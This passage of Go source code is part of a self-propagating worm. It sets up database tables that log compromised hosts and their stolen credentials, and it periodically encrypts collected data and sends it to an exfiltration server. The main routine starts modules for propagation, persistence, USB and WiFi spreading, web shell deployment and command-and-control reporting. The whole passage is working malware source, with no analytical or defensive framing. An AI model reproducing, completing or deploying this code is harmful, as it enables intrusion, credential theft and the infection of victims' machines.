        `CREATE TABLE IF NOT EXISTS exfil_data (
            id BIGINT AUTO_INCREMENT PRIMARY KEY,
            worm_id VARCHAR(64) NOT NULL,
            timestamp DATETIME NOT NULL,
            data_type VARCHAR(50) NOT NULL,
            target VARCHAR(255),
            data LONGTEXT,
            encrypted BOOLEAN DEFAULT TRUE,
            processed BOOLEAN DEFAULT FALSE,
            INDEX idx_worm_id (worm_id),
            INDEX idx_timestamp (timestamp)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
        
        `CREATE TABLE IF NOT EXISTS worm_instances (
            worm_id VARCHAR(64) PRIMARY KEY,
            ip_address VARCHAR(45),
            hostname VARCHAR(255),
            os VARCHAR(50),
            first_seen DATETIME,
            last_seen DATETIME,
            status VARCHAR(20),
            capabilities JSON
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
        
        `CREATE TABLE IF NOT EXISTS compromised_targets (
            id BIGINT AUTO_INCREMENT PRIMARY KEY,
            target_ip VARCHAR(45),
            target_hostname VARCHAR(255),
            worm_id VARCHAR(64),
            compromise_time DATETIME,
            method VARCHAR(50),
            credentials JSON,
            UNIQUE KEY uk_target (target_ip)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
    }
    
    for _, query := range queries {
        de.dbConn.Exec(query)
    }
}

func (de *DataExfiltrator) httpExfilLoop() {
    ticker := time.NewTicker(1 * time.Minute)
    for range ticker.C {
        de.mu.Lock()
        if len(de.buffer) == 0 {
            de.mu.Unlock()
            continue
        }
        
        // Take a copy of buffer
        batch := make([]ExfilData, len(de.buffer))
        copy(batch, de.buffer)
        de.buffer = make([]ExfilData, 0)
        de.mu.Unlock()
        
        // Send via HTTP
        data, _ := json.Marshal(batch)
        encrypted := de.encryptData(data)
        
        resp, err := de.httpClient.Post(DATA_EXFIL_SERVER, "application/octet-stream", 
            bytes.NewReader(encrypted))
        if err == nil && resp.StatusCode == 200 {
            fmt.Printf("[Exfil] Successfully exfiltrated %d records\n", len(batch))
        } else {
            // Re-add to buffer
            de.mu.Lock()
            de.buffer = append(batch, de.buffer...)
            de.mu.Unlock()
        }
        if resp != nil {
            resp.Body.Close()
        }
    }
}

func (de *DataExfiltrator) encryptData(data []byte) []byte {
    key := sha256.Sum256([]byte(wormID))
    block, _ := aes.NewCipher(key[:])
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)
    return gcm.Seal(nonce, nonce, data, nil)
}

func (de *DataExfiltrator) AddData(data ExfilData) {
    de.mu.Lock()
    defer de.mu.Unlock()
    
    de.buffer = append(de.buffer, data)
    
    // Try direct DB insert
    if de.dbConn != nil {
        _, err := de.dbConn.Exec(
            "INSERT INTO exfil_data (worm_id, timestamp, data_type, target, data, encrypted) VALUES (?, ?, ?, ?, ?, ?)",
            data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
        if err == nil {
            // Remove from buffer if successfully inserted to DB
            de.buffer = de.buffer[:len(de.buffer)-1]
        }
    }
    
    // If buffer is full, trigger immediate flush
    if len(de.buffer) >= de.batchSize {
        go de.processBuffer()
    }
}

func (de *DataExfiltrator) processBuffer() {
    de.mu.Lock()
    if len(de.buffer) == 0 {
        de.mu.Unlock()
        return
    }
    
    batch := make([]ExfilData, len(de.buffer))
    copy(batch, de.buffer)
    de.buffer = make([]ExfilData, 0)
    de.mu.Unlock()
    
    // Try database insert first
    if de.dbConn != nil {
        tx, err := de.dbConn.Begin()
        if err == nil {
            stmt, _ := tx.Prepare("INSERT INTO exfil_data (worm_id, timestamp, data_type, target, data, encrypted) VALUES (?, ?, ?, ?, ?, ?)")
            for _, data := range batch {
                stmt.Exec(data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
            }
            tx.Commit()
            fmt.Printf("[Exfil] Inserted %d records to database\n", len(batch))
            return
        }
    }
    
    // Fallback to HTTP
    data, _ := json.Marshal(batch)
    encrypted := de.encryptData(data)
    de.httpClient.Post(DATA_EXFIL_SERVER, "application/octet-stream", bytes.NewReader(encrypted))
}

// ========== UPDATED MAIN WORM STRUCTURE ==========

type Worm struct {
    id               string
    population       *WormPopulation
    propagator       *Propagator
    persistence      *PersistenceManager
    usbPropagator    *USBPropagator
    webShellManager  *WebShellManager
    wifiPropagator   *WiFiPropagator
    c2Manager        *C2Manager
    dataExfiltrator  *DataExfiltrator
    status           string
    mu               sync.Mutex
}

func NewWorm() *Worm {
    wormID = generateID()
    dataBuffer = make(chan ExfilData, 1000)
    
    w := &Worm{
        id:     wormID,
        status: "INITIALIZING",
    }
    
    w.population = NewWormPopulation()
    w.propagator = NewPropagator(w.population)
    w.persistence = NewPersistenceManager()
    w.usbPropagator = NewUSBPropagator()
    w.webShellManager = NewWebShellManager()
    w.wifiPropagator = NewWiFiPropagator()
    w.c2Manager = NewC2Manager()
    w.dataExfiltrator = NewDataExfiltrator()
    
    return w
}

func (w *Worm) Run() {
    fmt.Printf("[Worm-BB] Instance %s starting on %s (Version %s)\n", w.id, runtime.GOOS, VERSION)
    
    // Initialize all modules
    w.population.CoordinateWithPeers()
    w.persistence.InstallAll()
    go w.propagator.Start()
    go w.usbPropagator.StartMonitoring()
    go w.wifiPropagator.Start()
    go w.c2Manager.Start()
    go w.dataExfiltrator.Start()
    
    // Main loop
    w.maintenanceLoop()
}

func (w *Worm) maintenanceLoop() {
    ticker := time.NewTicker(30 * time.Second)
    for range ticker.C {
        w.status = "ACTIVE"
        
        // Report population status to C2
        w.c2Manager.sendToC2("STATUS", map[string]interface{}{
            "population": len(w.population.knownInstances),
            "role":       w.population.leader,
            "usb_infected": len(w.usbPropagator.infectedUSBs),
            "webshells":  len(w.webShellManager.deployed),
        })
    }
}

func main() {
    worm := NewWorm()
    worm.Run()
    select {}
}
